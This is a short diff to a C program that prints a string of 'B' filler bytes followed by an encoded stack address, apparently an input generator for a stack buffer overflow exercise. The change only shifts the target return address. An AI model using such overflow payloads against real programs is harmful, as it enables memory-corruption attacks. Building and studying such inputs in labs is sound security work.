@@ -4,5 +4,5 @@
 int main()
 {
         printf("BBBBBBBBBBBBBBBBBBBBBBB" \
-                "\xa0\xfd\xff\xbf");
+                "\xa0\xf5\xff\xbf");
 }
